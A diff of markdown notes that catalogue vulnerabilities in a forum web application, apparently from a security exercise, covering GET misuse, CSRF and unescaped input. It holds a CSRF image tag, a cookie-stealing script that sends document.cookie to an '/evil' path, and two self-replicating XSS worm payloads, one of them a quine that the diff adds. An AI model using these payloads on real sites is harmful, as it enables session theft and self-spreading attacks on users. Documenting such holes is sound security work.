@@ -32,11 +32,11 @@ escaped.
 
 ## Forum
 
-2. GET: Using GET method instead of POST
+1. GET: Using GET method instead of POST
    * No re-confirmation when reloading a page. You simply re-post.
-3. CSRF: site does not check for origin of the request
+2. CSRF: site does not check for origin of the request
    * Images can cause damage: `<img src='/forum?action=new&title=XSS&content=imageXSS'/>`
-4. XSS: Many things not escaped. Title, content, user's name.
+3. XSS: Many things not escaped. Title, content, user's name.
    * Self replicating post:
       ```HTML
       <span class="xss">
@@ -46,6 +46,12 @@ escaped.
                     encodeURIComponent($(".xss")[0].outerHTML));
           </script>
       </span>
+      Quil?
+      <script>
+          var prog = "Quil?<script>var prog = @;$.get('?action=new&title=XSS&content='+encodeURIComponent(prog.replace('@', prog)+'t>'));</scrip";
+          $.get('?action=new&title=XSS&content='+
+                encodeURIComponent(prog.replace('@', prog)+'t>'));
+      </script>
       ```
    * __Steal cookies__: `<script> $.get("/evil?save=cookie&cookie="+encodeURI(document.cookie)); </script>`
 
